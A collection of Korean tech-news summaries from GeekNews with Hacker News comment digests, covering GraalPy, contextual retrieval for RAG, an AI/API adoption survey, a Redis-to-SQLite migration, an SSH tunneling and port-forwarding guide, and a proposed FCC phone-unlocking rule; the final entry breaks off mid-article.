"https://news.hada.io/topic?id=16828","GraalPy - 고성능 임베디드 Python 3 런타임","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    GraalPy - 고성능 임베디드 Python 3 런타임

     * Java를 위한 고성능 임베더블 Python 3 런타임
     * Java에서 직접 Python 패키지를 로드하고 사용할 수 있음
     * 최신 Python AI 및 데이터 과학 패키지와 호환 가능
     * Graal JIT 컴파일러를 통해 네이티브 코드 속도로 Python 실행 가능
     * Jython 사용자에게 업그레이드 경로 제공
     * Java에서 Python 스크립트를 사용하여 Java 클래스 및 프레임워크와 상호작용 가능
     * GraalVM Native Image를 사용하여 Python 애플리케이션을 단일 바이너리로 패키징 가능

GN⁺의 정리

     * GraalPy는 Java에서 Python을 고성능으로 실행할 수 있는 런타임을 제공함
     * Jython 사용자에게 현대적인 Python 기능을 사용할 수 있는 업그레이드 경로를 제공함
     * GraalVM의 폴리글랏 인터페이스를 통해 Python 데이터 과학 라이브러리를 Java 애플리케이션에 쉽게 통합할 수 있음
     * Python과 Java의 상호 운용성을 높여 개발자에게 유연성을 제공함
     * 비슷한 기능을 제공하는 프로젝트로는 Jython과 Py4J가 있음

        Hacker News 의견

     * GraalPy와 JDK8을 비교한 벤치마크 결과를 공유함
          + JDK8이 GraalPython EE 22.3 Hotspot보다 약 2.4배 빠름
          + JDK8이 CPython 3.11보다 41배 빠름
          + GraalPython이 CPython보다 약 17배 빠르고, PyPy보다 약 2배 빠름
          + Graal Enterprise Edition (EE)이 Community Edition (CE)보다 약 1.31배 빠름
     * GraalVM을 사용해 큰 프로젝트를 실행하려 했으나 몇 가지 문제 발생
          + Maturin이 Graal 인터프리터를 지원하지 않아 Py03 패키지 사용 불가
          + uv가 실행되지 않으며, os 패키지에서 fork와 execve가 누락됨
          + Graal이 인기 있는 라이브러리에 많은 패치를 적용해야 함
          + 큰 프로젝트에 Graal을 사용하는 것은 높은 위험성 때문에 어려움
     * GraalVM이 Java (또는 Scala) 함수를 브리지 없이 직접 호출할 수 있다면, Spark를 사용하는 프로그램에 유용할 것이라는 의견
     * Python의 흥미로운 점은 ML 툴체인, CUDA, Metal/MLX, pytorch, tensorflow, LLM 인코더/디코더 등과의 통합임
          + GraalVM이 이러한 코드들을 의미 있게 실행할 수 있는지 의문
     * Clojure에서 Java/Python 통합을 이미 구현한 사례가 있음
          + Chris Neurnberger와 libpython-clj 덕분에 가능
     * DuckDB는 현재 지원되지 않지만, Pandas와 matplotlib은 지원됨
          + DuckDB와 Polars가 지원된다면 많은 데이터 작업에 도움이 될 것이라는 의견
     * GraalPy가 Python 3.11을 타겟으로 한다는 것을 발견
          + GIL에 대한 언급은 없었음
          + Python 사용자라면 빠른 시작 링크를 클릭하지 말라는 경고
     * GraalPy의 사용 사례에 대한 의문 제기
          + 왜 GraalPy를 사용해야 하는지 이해하지 못하겠다는 의견
     * GraalPy가 GraalVM에서만 실행되어야 하는지, 다른 JVM 구현에서도 가능한지에 대한 질문

   지금 하고 있는 프로젝트가 python numpy, pandas 로 구현한 것을 java 에서 해 달라는 넋 나간 프로젝트 입니다. 지금 처음부터 다 만들고 있죠. 말도 안되는 . GraalPy에서 pandas, numpy가 제대로 지원된다면 이 뻘짓을 안 할수 도 있겠네요. 그런데 window 환경에서는 visual studio 종속성이 있네요. c++컴파일 환경을 위해서요. 그리고 참 아이디어 좋고 유용한데 너무나 방대한 에코시스템을 어떻게 실패없이 완성할수 있을까. 좀 걱정도 되고 . 과연 안정적으로 믿고 사용할수 있게 될까 의심도 되고 그렇네요. 그렇게만 된다면 좋겠군요.

   좀 더 살펴보니 제가 잘못 이해한 부분이 있었네요. gcc 나 vs 의 종속성은 native image 를 사용하는 경우에만 필요하네요.
"
"https://news.hada.io/topic?id=16873","맥락 검색 기술","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                맥락 검색 기술

    Contextual Retrieval 소개

     * AI 모델이 특정 맥락에서 유용하려면 배경 지식이 필요함
     * 고객 지원 챗봇은 특정 비즈니스에 대한 지식이 필요하고, 법률 분석 봇은 과거 사례에 대한 방대한 지식이 필요함
     * 개발자는 일반적으로 Retrieval-Augmented Generation (RAG)을 사용하여 AI 모델의 지식을 향상시킴
     * 전통적인 RAG 솔루션은 정보를 인코딩할 때 맥락을 제거하여 관련 정보를 검색하지 못하는 경우가 많음

    Contextual Retrieval 방법

     * Contextual Retrieval은 RAG의 검색 단계를 크게 개선하는 방법임
     * 두 가지 하위 기술인 Contextual Embeddings와 Contextual BM25를 사용함
     * 실패한 검색 횟수를 49% 줄이고, 재랭킹과 결합하면 67%까지 줄일 수 있음
     * Claude를 사용하여 Contextual Retrieval 솔루션을 쉽게 배포할 수 있음

    단순히 더 긴 프롬프트 사용

     * 지식 베이스가 200,000 토큰 이하인 경우 전체 지식 베이스를 모델에 제공하는 것이 더 나은 방법일 수 있음
     * Claude의 프롬프트 캐싱 기능을 사용하면 이 접근 방식이 더 빠르고 비용 효율적임
     * 지식 베이스가 커지면 더 확장 가능한 솔루션이 필요함

    RAG의 기본 개념

     * RAG는 큰 지식 베이스를 처리하기 위해 사용됨
     * 지식 베이스를 작은 텍스트 조각으로 나누고, 임베딩 모델을 사용하여 의미를 인코딩함
     * 벡터 데이터베이스에 저장하여 의미적 유사성에 따라 검색함
     * BM25는 정확한 단어 또는 구문 일치를 찾는 데 효과적임

    전통적인 RAG의 한계

     * 문서를 작은 조각으로 나누는 과정에서 맥락이 파괴될 수 있음
     * 예를 들어, 특정 회사의 재무 정보를 찾는 질문에 대해 충분한 맥락이 없는 조각이 반환될 수 있음

    Contextual Retrieval 구현

     * 각 조각에 설명적 맥락을 추가하여 임베딩 및 BM25 인덱스를 생성함
     * Claude를 사용하여 각 조각에 대한 간결한 맥락을 생성함
     * 프롬프트 캐싱을 사용하여 비용을 절감할 수 있음

    성능 개선

     * Contextual Embeddings는 검색 실패율을 35% 줄임
     * Contextual Embeddings와 Contextual BM25를 결합하면 검색 실패율을 49% 줄임

    구현 고려사항

     * 문서를 조각으로 나누는 방법, 임베딩 모델 선택, 사용자 정의 맥락화 프롬프트 등을 고려해야 함
     * 더 많은 조각을 포함하면 관련 정보를 포함할 가능성이 높아짐

    재랭킹을 통한 성능 향상

     * 재랭킹은 가장 관련성이 높은 조각만 모델에 전달하여 응답 품질을 향상시킴
     * 재랭킹된 Contextual Embedding과 Contextual BM25는 검색 실패율을 67% 줄임

    결론

     * Embeddings와 BM25를 결합하면 더 나은 결과를 얻을 수 있음
     * Voyage와 Gemini 임베딩이 가장 효과적임
     * 상위 20개의 조각을 모델에 전달하는 것이 가장 효과적임
     * 맥락을 추가하면 검색 정확도가 크게 향상됨
     * 재랭킹은 성능을 더욱 향상시킴

    GN⁺의 정리

     * Contextual Retrieval은 AI 모델의 검색 정확도를 크게 향상시킬 수 있는 방법임
     * 특히 큰 지식 베이스를 다룰 때 유용함
     * Claude의 프롬프트 캐싱 기능을 사용하면 비용 효율적으로 구현할 수 있음
     * 다른 유사한 기능을 가진 프로젝트로는 OpenAI의 GPT-3와 Google의 BERT가 있음

        Hacker News 의견

     * 첫 번째 의견
          + 정부 기관을 위한 기업 RAG 구축 경험 공유
          + RAGAS 지표를 사용한 A/B 테스트 결과:
               o 하이브리드 검색(의미론적 + 벡터)과 LLM 기반 재랭킹은 합성 평가 질문에서 큰 변화 없음
               o HyDE는 합성 평가 질문에서 답변 및 검색 품질을 심각하게 저하시킴
          + 하이브리드 검색은 항상 유용하지만, 한 가지 방법이 항상 우승하지 않음
          + Azure AI Search의 의미론적 검색이 벡터 유사성과 함께 충분히 효과적임
          + 다양한 방법을 테스트할 필요가 있음
          + 다음 시도할 것들:
               o RAPTOR
               o SelfRAG
               o Agentic RAG
               o 쿼리 정제(확장 및 하위 쿼리)
               o GraphRAG
          + 배운 점:
               o 항상 기준선과 실험을 사용하여 귀무 가설을 반박하려고 시도해야 함
               o 세 가지 유형의 평가 질문/답변 사용: 전문가 작성, 실제 사용자 질문, 합성 질문
     * 두 번째 의견
          + 프롬프트 캐싱을 활용하는 방식이 마음에 듦
          + 캐싱 덕분에 프롬프트 비용이 1/10로 줄어듦
          + 캐싱 비용 절감으로 다양한 트릭이 가능해짐
          + 컨텍스추얼 검색과 프롬프트 캐싱에 대한 노트 공유
     * 세 번째 의견
          + RAG 결과를 개선하기 위해 LLM을 사용하여 기본 청크를 확장하는 접근법은 흔함
          + HyDE를 사용한 쿼리 확장은 항상 개선되지 않음
          + Anthropic의 새로운 점은 프롬프트 캐싱 도입
          + 프롬프트 캐싱은 긴 문서를 컨텍스트로 제공하여 비용을 절감함
          + Cohere API가 매우 만족스러움
     * 네 번째 의견
          + 문서를 h1, h2, h3 헤딩을 기준으로 청크로 나누고, 청크 시작 부분에 헤더를 추가하는 방식 사용
          + 예시:
               o 기존 청크: ""성인의 일반적인 복용량은 하루에 3번 200mg 정제 또는 캡슐 1~2개""
               o 새로운 청크: ""# 열 ## 치료 --- 성인의 일반적인 복용량은 하루에 3번 200mg 정제 또는 캡슐 1~2개""
          + 이 방식은 LLM 없이도 잘 작동함
     * 다섯 번째 의견
          + 이 기술에 반대하는 입장
          + 벡터 임베딩은 첫 번째 줄 바꿈 텍스트 블록에 과도하게 집중할 수 있음
          + IDF 검색이 어느 정도 극복하지만 충분하지 않음
          + ""semantic boost""를 사용하여 임베딩을 문서의 제목, 요약 등으로 이동시킬 수 있음
          + Trieve API의 ""semantic boost"" 설명 공유
     * 여섯 번째 의견
          + ""링크드 리스트"" 전략을 사용하여 청크가 참조된 항목에 여러 포인터를 가지게 함
          + 각 댓글이 원래 게시물에 대한 포인터가 되는 방식으로 설명
          + 이 기술의 예시 공유
     * 일곱 번째 의견
          + 200k 토큰을 사용하여 작은 데이터셋에서 최상의 답변을 얻는다는 주장은 경험과 다름
          + 프롬프트가 커질수록 출력이 일관되지 않고 지시를 따르기 어려워짐
          + 다른 사람들도 비슷한 경험을 했는지, 이를 피하는 방법이 있는지 궁금함
     * 여덟 번째 의견
          + RAG를 사용하여 지식을 검색하는 대신 규칙을 검색하는 문제에 직면함
          + 특정 규칙이 적용될 수 있는지 판단하기 위해 작은 분류기를 훈련시키는 접근법 제안
          + 예시: 멀티 유저 던전 게임에서 특정 규칙이 적용되는지 여부를 판단하는 방식
          + 규칙이 적용되는지 여부를 결정하는 것이 더 추상적이고 어려운 문제임
          + 이 문제를 해결할 방법을 찾고 있음
     * 아홉 번째 의견
          + 지식 베이스가 200,000 토큰(약 500 페이지)보다 작을 경우
          + Anthropic이 토크나이저를 공개해주길 바람
     * 열 번째 의견
          + AI 산업이 다시 TF-IDF로 돌아가는 날을 기다림
"
"https://news.hada.io/topic?id=16923","AI Impact 보고서 2024 : AI 도입과 혁신 현황","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   AI Impact 보고서 2024 : AI 도입과 혁신 현황

     * AI는 현재 기업에서 최우선 과제 중 하나이며, 이미 실질적인 비즈니스 가치를 창출하고 있음
     * 92%가 AI를 우선순위로 꼽았고, 83%는 AI 투자로 지난 해 새로운 제품/서비스 기회를 만들었다고 응답함
     * 기업의 숙제는 AI를 어떻게 빠르게 도입할 것인가에서, 보안과 컴플라이언스를 해치지 않으면서 AI를 어떻게 채택할 것인가로 바뀌고 있음
     * 직원들의 일하는 방식과 고용주의 정책 간 간극으로 인해 정책과 모범사례가 무시되는 난맥상을 보이기도 함
     * API가 AI 시대의 핵심 역할을 하며, API 관리 도구로 AI의 컴플라이언스와 보안을 담보할 수 있음

Is AI living up to the hype?

     * 혁신과 AI 활용이 올해 최우선 과제로 꼽힘
     * 92%가 AI를 우선순위로 보고 있음
     * 리더십이 가장 주목해야 할 분야로는 생성형 AI(56%)와 적절한 도구 선택(55%)이 꼽힘
     * 83%는 AI 투자로 새로운 제품/서비스 기회를 얻었다고 응답함
     * 가장 많이 사용되는 LLM은 ChatGPT(27%), Azure AI(18%), Google Gemini(17%) 순

Why are APIs essential in the AI age?

     * API는 AI가 작동하는데 필수불가결한 요소
     * 2026년까지 API 수요 증가의 30% 이상이 AI와 LLM 툴에서 나올 것으로 예측됨
     * API 관리에서 가장 중요한 측면은 AI 통합(19%)과 API 보안/거버넌스(15%)로 나타남

The economic impact of APIs

     * API가 AI를 지원하는 가치는 2030년까지 170% 성장해 누적 경제효과 43조 달러에 이를 전망
     * API의 경제적 효과는 현재 전세계적으로 11.7조 달러 규모이며, 2030년 17.3조 달러까지 증가 예상
     * 2030년 API의 경제 효과는 전세계 GDP의 14%를 차지할 전망
     * 2030년까지 미국 내 연간 API 공격 건수는 548% 증가한 약 42,000건에 달할 것으로 예측됨

AI governance and management

     * 80%는 조직에 AI 사용에 대한 가이드라인이나 제한이 있다고 응답함
     * 제한의 주된 이유는 데이터 프라이버시/보안(34%)과 컴플라이언스(26%)
     * AI 제한이 있는 곳에서 60%는 우회할 방법을 찾는다고 함
     * 72%는 DLP나 AI 게이트웨이 같은 도구로 AI 사용을 통제한다고 함
     * AI 통합 시 주된 과제로는 데이터 프라이버시(60%)와 보안/거버넌스(55%)가 꼽힘

The AI outlook

     * 60%는 AI에 대해 열정적이며 57%는 AI가 자신의 업무를 쉽게 만들 것이라 봄
     * 35%는 AI 도입이 너무 빠르다고 느끼며, 18%는 AI로 인한 정리해고 가능성을 우려함
     * 50%는 AI가 생산성과 혁신을 촉진할 것으로 보며, 26%는 AI로 새로운 직무나 기회가 만들어질 것으로 기대함

Conclusion

     * 조직은 AI 혁신을 가능케 하되 보안과 컴플라이언스를 타협하지 않는 방안을 모색해야 함
     * AI와 API의 결합은 혁신의 길이자 경쟁우위 확보를 위한 핵심 전략임

GN⁺의 의견

     * 이 보고서는 AI와 API에 대한 기업들의 현재 인식과 활용 현황을 잘 보여줌. 특히 AI에 대해 대체로 긍정적이고 적극적인 자세를 취하고 있는 점이 흥미로움
     * API가 AI를 지원하고 제어하는데 핵심적인 역할을 한다는 점, AI로 인한 보안 위험과 이를 관리할 필요성 등 시사하는 바가 큼
     * AI가 업무 환경에 미칠 영향에 대해서는 낙관과 우려가 공존하고 있음. 단순히 생산성 향상 차원을 넘어 일자리에 미칠 영향에 대한 불안감도 엿보임
     * 기업은 AI 활용을 더 이상 피할 수 없는 상황임. 하지만 거버넌스 체계 마련이 시급해 보임. 직원들이 우회로를 찾을 정도로 정책과 현실의 격차가 큰 상태임
     * 기업의 AI 플랫폼이나 도구 선택이 매우 중요해졌음. 개별 솔루션 보다는 통합 관점의 접근이 필요해 보이며, API 관리 툴이 이런 측면에서 효과적인 해법이 될 수 있을 것으로 보임

   ""이미 실질적인 비즈니스 가치를 창출하고 있음"" 대표적인 기업이 어딜까요

   AI Impact Report가 아니라 API Impact Report입니다. ^^
"
"https://news.hada.io/topic?id=16929","Redis에서 SQLite로 재구조화(Rearchitecting)","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  Redis에서 SQLite로 재구조화(Rearchitecting)

     * Wafris는 Rails 미들웨어 클라이언트를 제공하는 오픈 소스 웹 애플리케이션 방화벽 회사임
     * v1 클라이언트는 로컬 Redis 데이터 저장소가 필요했으나, v2에서는 SQLite를 사용함
     * Redis에서 SQLite로 마이그레이션하기로 결정한 배경과 성능 고려사항, 아키텍처 변경 사항을 설명

TL;DR

     * SQLite는 잘하는 것과 못하는 것이 있음
     * Redis는 잘하는 것과 못하는 것이 있음
     * 전통적인 RDBMS(Postgres/MySQL)는 잘하는 것과 못하는 것이 있음
     * 이러한 데이터 저장소는 직접 교체할 수 없으며, 그렇게 하려고 하면 곤란해짐
     * 이 글은 Redis 기반 v1 클라이언트를 SQLite 기반 v2 클라이언트로 리아키텍팅하면서 거친 테스트와 의사 결정 과정을 설명함

변경을 강제한 요인

     * Wafris의 목표는 개발자들이 쉽게 사이트를 보호할 수 있게 만드는 것임
     * Redis 배포 이슈로 인해 v1은 이 목표를 완전히 달성하지 못함
     * Heroku 등 Redis를 쉽게 사용할 수 있는 환경에서 작업했기에 Redis를 선택했으나, 많은 사용자가 Redis 배포 이슈를 겪음
     * Redis 같은 별도 DB를 사용하게 하는 건 사용자를 위한 게 아님

""속도""란 무엇인가?

     * Redis는 전통적 RDBMS보다 ""빠르지만"", 여전히 연결, 메모리, 프로세스 등을 관리해야 함
     * 클라우드 환경에서는 네트워크 지연이 큰 문제가 될 수 있음
     * 들어오는 HTTP 요청마다 Wafris 규칙을 평가해야 하므로 네트워크 지연이 애플리케이션 속도를 늦출 수 있음

단일체(Monolith-ish) 가정

     * 완전 분산 애플리케이션도 있지만, 대부분 Rails 앱은 ""장엄한 모놀리스(Majestic Monoliths,단일체)""임
     * 여러 영역에 배포되고, 기능이 겹치는 서버로 분할되거나, 부분적으로만 Rails인 앱은 Redis 사용 시 더 많은 문제가 발생함

아키텍처에 대한 재고

     * Wafris는 Rails 미들웨어로 설치되는 웹 애플리케이션 방화벽임
     * 간단히 2단계로 나누면 1) HTTP 요청을 규칙과 비교하고, 2) 처리 결과를 보고함
     * 규칙 ""읽기""(1단계)가 ""쓰기""(2단계)보다 훨씬 중요함
     * 읽기는 순차적으로 처리되어야 하고, 실패하면 안되며, 사용자 체감 성능에 영향을 줌
     * 쓰기는 느리게, 일괄 처리하거나 비동기로 할 수 있음

Enter SQLite

     * SQLite가 적합한 용도에 대해서는 다른 이들이 잘 설명하고 있음
     * SQLite는 클라이언트/서버 DB와 경쟁하는 게 아니라 fopen()과 경쟁함
     * 네트워크 왕복을 제거하면 Redis보다 훨씬 빨라질 것으로 예상됨
     * SQLite와 Redis의 벤치마크 평가를 결정함

SQLite와 Redis 벤치마킹

     * 벤치마킹은 정밀한 숫자로 자신을 속이는 어두운 기술임
     * 데이터 저장소 벤치마킹은 더욱 까다로움
     * 절대적 속도를 구하려는 게 아니라 우리 데이터와 사용 사례에 특화된 벤치마크를 만듦
     * 최적화 트윅은 무시함. Wafris를 앱에 넣으면 바로 작동하길 원함
     * 이론적 벤치마크가 아닌 우리 앱의 주요 경로와 최악의 쿼리를 테스트함
     * IP 범위(IPv4, IPv6)를 범주에 매핑하는 복잡한 ""lexical decimal"" 자료구조 요청이 최악의 쿼리임
     * 범위 조회를 미리 계산해 SQLite 테이블과 Redis 정렬 집합에 씀
     * 들어오는 HTTP 요청마다 요청 IP를 허용/차단 사용자 지정 범위, GeoIP 범위, IP 평판 범위와 비교해야 함

테스트 프로토콜

     * M2 맥북 에어에서 홈브루로 설치한 Redis와 로컬 SQLite DB로 테스트함
     * 기존 범위 데이터 세트(120만 개 항목)에 대해 테스트함
     * 여러 IP 세트를 SQLite와 Redis에 동일한 순서로 실행함
     * 각 배수마다 테스트를 5번 실행하고 평균을 냄

테스트 결과

     * SQLite가 Redis를 압도적으로 이김(우리의 특수한 사용 사례에서)
     * SQLite는 로컬 Redis 인스턴스보다 약 3배 빨랐음
     * 네트워크 지연을 고려하기 전의 결과임
     * SQLite가 Redis와 동등하기만 해도 네트워크 시간을 없앨 수 있어 이득임

차트에서 빠진 것

     * SQLite 성능이 벤치마크에서 2배 나빠도 실제로는 네트워크 지연 때문에 더 빠를 수 있음
     * Redis 서버를 아무리 강력하게 해도 네트워크 대역폭, 연결 등의 한계가 있고 지역 간 지연이 있음
     * SQLite는 ""무료로"" 거의 무한한 수평 확장이 가능함
     * SQLite로 온보딩이 훨씬 좋아짐. 사용자는 사용되는지도 모를 것임
     * Redis에서 더 많은 성능을 뽑아낼 수 있지만, 사용자가 Redis 설정을 변경하도록 설득하기 어려웠음

결과는 시작에 불과함

     * SQLite가 Redis보다 빠르다고 입증했지만 실제 절충이 있음
     * 위 테스트에서는 쓰기를 고려하지 않음
     * 읽기와 쓰기가 경쟁하는 것을 관리하기 위해 DB에 연결, 연결 풀, 트랜잭션 등이 필요함
     * 마치 전기 슈퍼카가 콘크리트 블록을 싣고 가기 어려운 것처럼, SQLite를 적합하지 않은 역할에 쓰면 안 됨

동기화 아키텍처 구축

     * v1(Redis)에서는 사용자가 Wafris Hub에서 규칙을 업데이트하면 Redis 데이터 저장소의 규칙이 업데이트됨
     * SQLite에서는 웹 서버로 ""푸시""할 수 없으므로 작동하지 않음
     * v2(SQLite)에서는 1) 사용자가 Wafris Hub에서 규칙 업데이트 2) 일정 간격으로 클라이언트가 업데이트된 규칙 확인 3) 규칙이 업데이트되면 완전히 새로운 SQLite DB 다운로드
     * 이는 사용자의 설치 및 구성 책임을 크게 줄여줌
     * v2 클라이언트의 설치 성공률이 3배 증가함

SQLite 분산 아키텍처

     * 자동 확장이 활성화된 클라우드 제공업체에 배포된 Rails 앱을 고려해보자
     * 요청이 100req/s에서 10,000req/s로 증가하면 컴퓨팅 인스턴스는 확장되지만 DB는 그렇지 않음
     * 실제로 Rails 앱이 과부하로 인해 중단되는 주된 이유임
     * SQLite DB를 각 컴퓨팅 인스턴스에 동기화하면 모든 호출을 로컬로 유지할 수 있어 이 문제를 해결함

쓰기는 어떻게 하나?

     * 앱을 읽기(규칙 평가)와 쓰기(보고) 경로로 분할한 다음 쓰기 경로는 무시했음
     * 쓰기 경로는 1) Wafris Hub에 비동기로 연결해 보고 2) 보고서 일괄 전송 3) 클라이언트에서 DB 쓰기 완전 제거로 재설계함
     * 다른 사람들에게는 작동하지 않겠지만, 우리는 배포가 쉽고 빠른 Wafris 클라이언트를 원하는 사용자만 신경 씀

결론

     * SQLite를 사용하는 v2 아키텍처에 매우 만족함
     * 이미 많은 사이트가 공격을 견디고 온라인 상태를 유지하는 데 도움이 됨
     * 시작하기가 훨씬 쉬워져 우리의 지원 작업과 사용자의 번거로움이 줄어듦
     * 이는 더 안전하고 보안성 높은 인터넷을 위한 승리라고 생각함

   Sqlite가 충분히 좋긴 한데, 이 경우는 어쩐지 그냥 redis에 적합하지 않은 use case였던 것이 아닌지... 싶네요.

   벤치마크를 M2에서 했다는건 좀..

   그러면 aws 인스턴스마다 다 측정해봐야하나요? 오픈소스에 바라는게 너무 많으시네요

   같은 서버 환경에서 진행을 한건데 문제가 되나요?
   벤치마크에는 특정 CPU를 써야하는 건지...?

   m2에서 한것이 어떤점이 문제가 될 수 있을까요? (실제 서비스 환경이 m2프로세서가 아니라는 점 외에)

   그게 문제죠. 실험실에서 실험하고, 이건 상업용으로 완벽하다! 라고 주장하는것.

   자기만족에 가깝죠.
"
"https://news.hada.io/topic?id=16859","SSH 터널링 및 포트 포워딩 시각 가이드 (2023)","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     SSH 터널링 및 포트 포워딩 시각 가이드 (2023)

    SSH 터널링 및 포트 포워딩에 대한 시각적 가이드

     * 요약: 이 블로그 포스트는 SSH 터널링 및 포트 포워딩에 대한 이해를 돕기 위해 작성되었음. 주제는 사용 사례, 설정, SSH 점프호스트, 로컬/원격/동적 포트 포워딩, 그리고 제한 사항을 포함함.

      사용 사례

     * 보안:
          + FTP와 같은 안전하지 않은 연결 암호화
          + SSH 터널을 통한 웹 관리자 패널 접근 (공개 키 인증)
          + 노출되는 포트 수 감소 (22번 포트만 노출)
     * 문제 해결:
          + 방화벽/콘텐츠 필터 우회
          + 다른 경로 선택
     * 연결:
          + NAT 뒤에 있는 서버 접근
          + 점프호스트를 사용하여 인터넷을 통해 내부 서버 접근
          + 로컬 포트를 인터넷에 노출

      포트 포워딩

     * 설정/준비:
          + 로컬 및 원격 사용자는 포트를 열기 위한 권한이 필요함
          + 0-1024번 포트는 루트 권한이 필요함
          + 클라이언트와 네트워크 방화벽을 적절히 설정
          + SSH 서버에서 포트 포워딩을 활성화해야 함: AllowTcpForwarding yes
          + 다른 인터페이스에서 포트를 포워딩하려면 GatewayPorts yes를 활성화해야 함

      SSH 점프호스트 / SSH 터널

     * 점프호스트를 통한 연결:
ssh -J user@REMOTE-MACHINE:22 -p 22 user@10.99.99.1

     * 여러 점프호스트 사용:
ssh -J user@REMOTE-MACHINE:22,user@ANOTHER-REMOTE-MACHINE:22 -p 22 user@10.99.99.1

      로컬 포트 포워딩

     * 예제 1:
ssh -L 10.10.10.1:8001:localhost:8000 user@REMOTE-MACHINE

     * 예제 2:
ssh -L 8001:10.99.99.1:8000 user@REMOTE-MACHINE

      원격 포트 포워딩

     * 예제 1+2:
ssh -R 8000:localhost:8001 user@REMOTE-MACHINE
ssh -R 8000:10.10.10.2:8001 user@REMOTE-MACHINE

     * 예제 3:
ssh -R 10.99.99.2:8000:10.10.10.2:8001 user@REMOTE-MACHINE

      동적 포트 포워딩

     * SOCKS 프로토콜 사용:
ssh -D 10.10.10.1:5555 user@REMOTE-MACHINE

      SSH TUN/TAP 터널링

     * 양방향 TCP 터널 생성:
ssh -w local_tun[:remote_tun]

      백그라운드에서 SSH 실행

     * 백그라운드 실행:
ssh -fN -L 8001:127.0.0.1:8000 user@REMOTE-MACHINE

     * 백그라운드 SSH 중지:
ps -ef | grep ssh
kill <PID>

      SSH 연결 유지

     * 타임아웃 처리:
          + ClientAliveInterval 15
          + ClientAliveCountMax 3

      제한 사항

     * UDP:
          + SSH는 신뢰할 수 있는 전달을 필요로 하므로 UDP는 지원되지 않음
     * TCP-over-TCP:
          + 오버헤드 증가로 인해 처리량이 감소하고 지연 시간이 증가함
     * VPN 대체 아님:
          + SSH 터널링은 VPN을 대체할 수 있지만, 성능 면에서 VPN이 더 적합함
     * 잠재적 보안 위험:
          + 필요하지 않은 기능은 비활성화하는 것이 좋음

    GN⁺의 정리

     * 이 글은 SSH 터널링과 포트 포워딩의 다양한 사용 사례와 설정 방법을 설명함
     * SSH 터널링은 보안 연결을 제공하고 방화벽을 우회하는 데 유용함
     * 그러나 VPN을 대체할 수는 없으며, 성능 저하와 같은 제한 사항이 있음
     * 관련된 다른 프로젝트로는 OpenVPN과 같은 VPN 솔루션이 있음

        Hacker News 의견

     * 2024년에는 SSH 명령어를 직접 작성하는 대신, ~/.ssh/config 파일을 사용하여 LocalForward, RemoteForward, ProxyJump를 설정하는 것이 좋음
          + 예시 설정을 통해 여러 중간 SSH 연결을 거쳐 데이터를 전송할 때 시간을 절약할 수 있음
          + 설정 후에는 별칭을 통해 target-server에 SSH, SCP, RSYNC를 사용할 수 있음
          + LocalForward와 RemoteForward 설정을 통해 포트 포워딩을 쉽게 할 수 있음
     * SSH 터널링은 복잡한 회사 환경에서 필수적임
          + 많은 관료주의와 대기 시간 때문에 필요한 접근 권한을 얻는 데 시간이 걸림
          + ssh -D 8888 someserver 명령어를 사용하여 브라우저의 SOCKS 프록시를 localhost:8888로 설정하면 브라우저 트래픽이 해당 서버를 통해 라우팅됨
     * 방화벽 뒤에 있고 고정 IP가 없는 리눅스 서버나 IoT 장치에 SSH 접속을 원할 때는 터널링 서비스를 사용할 수 있음
          + 예: sshreach.me
     * 가장 복잡한 SSH 터널링 해킹 경험은 데이터 센터 간 연결에서 발생함
          + A에서 B로, B에서 C로 데이터를 이동해야 했음
          + rsync, SSH 터널, 키, 라우팅을 조합하여 데이터를 성공적으로 이동시킴
          + 당시에는 큰 성취였으며, 지금도 그 기억이 생생함
     * 네트워킹 시각화가 더 많이 이루어지길 바람
          + 특히 저수준 연결에서의 트래픽 시각화가 필요함
     * TCP-over-TCP는 오버헤드가 증가하고 지연 시간이 늘어나 성능이 저하될 수 있음
          + SSH 터널에서는 TAP/TUN을 사용하지 않는 한 문제가 되지 않음
          + 그러나 여러 채널을 사용할 경우 성능 저하가 발생할 수 있음
     * SSH 터널은 훌륭한 도구지만, 요즘에는 TLS와 리버스 프록시 기능이 내장된 도구를 더 많이 사용함
          + 관련 도구 목록: awesome-tunneling
     * sshuttle은 터널링에 더 나은 도구임
          + sshuttle -r user@host 10.0.0.0/8 명령어를 사용하여 VPN처럼 사용할 수 있음
     * 15년 전 대학 네트워크의 방화벽을 우회하기 위해 SSH 터널을 사용하기 시작함
          + 기본 포트를 443으로 변경하여 사용함
          + 이후로 방화벽 우회 외에도 다양한 용도로 사용 중임
     * SSH 자체에 리다이렉트 기능이 있는지 궁금함
          + A가 B에 SSH 접속을 시도하면 B가 C에 접속하라고 지시하고, A가 투명하게 C에 직접 접속하는 기능
          + B는 더 이상 중요한 데이터 경로의 일부가 아님
          + 이러한 기능이 존재하는지 궁금함
"
"https://news.hada.io/topic?id=16881","FCC, 60일 내 모든 휴대폰 잠금 해제 요구, AT&T와 T-Mobile 반대","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             FCC, 60일 내 모든 휴대폰 잠금 해제 요구, AT&T와 T-Mobile 반대

FCC, 60일 내 모든 휴대폰 잠금 해제 요구

     * 새로운 FCC 규칙 제안
          + FCC는 모든 휴대폰을 활성화 후 60일 이내에 잠금 해제하도록 요구하는 규칙을 제안함
          + 미결제 잔액이 있는 결제 계획에 있는 휴대폰도 포함됨
     * 통신사들의 반응
          + AT&T와 T-Mobile은 이 제안에 반대함
          + T-Mobile은 FCC가 이러한 변화를 승인할 권한이 없다고 주장하며, 이 변화가 결제 계획을 포기하게 만들 수 있다고 언급함
          + Verizon은 이미 60일 내에 휴대폰을 활성화하고 있어 이 제안을 지지함
     * 제안의 배경
          + 6월에 FCC는 이 규칙 변경을 제안하고 공공 의견을 수렴함
          + 7월 초에 이 문제를 추구할지 여부를 투표할 계획이었으며, 이후 5인 위원회에서 만장일치로 승인됨
          + 새로운 잠금 해제 정책이 곧 시행되는 것은 아니며, FCC는 규제 변경을 적극적으로 추구할 계획임
     * T-Mobile의 주장
          + T-Mobile은 이 변화가 경제적 부담을 초래할 것이라고 주장함
          + FCC가 명확한 법적 권한 없이 이러한 변화를 추진할 수 없다고 주장함
     * Verizon의 입장
          + Verizon은 이미 2008년 FCC와의 합의로 인해 60일 내 잠금 해제를 시행 중임
          + 이로 인해 Verizon은 이 제안을 지지하며, 경쟁사들이 동일한 규칙을 따르게 되어 경쟁이 공정해질 것이라고 주장함
     * 향후 전망
